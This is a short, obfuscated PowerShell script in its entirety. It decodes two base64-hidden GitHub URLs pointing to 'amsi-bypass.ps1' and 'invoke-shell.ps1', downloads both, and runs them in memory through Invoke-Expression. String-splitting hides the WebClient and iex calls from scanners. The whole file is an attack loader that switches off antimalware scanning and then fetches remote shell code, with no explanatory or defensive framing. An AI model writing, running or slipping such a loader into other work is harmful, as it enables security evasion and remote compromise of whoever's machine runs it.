$envVar = $env:COMPUTERNAME
$part1 = "Net.WebC"
$part2 = "lient"
$cmd = "iex"
$src1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9hbXNpLWJ5cGFzcy5wczE="))
$src2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9pbnZva2Utc2hlbGwucHMx"))
$dummy = "TestVar" + $envVar
$wc = New-Object ($part1 + $part2)
& $cmd ($wc.DownloadString($src1))
& $cmd ($wc.DownloadString($src2))
$wc.Dispose()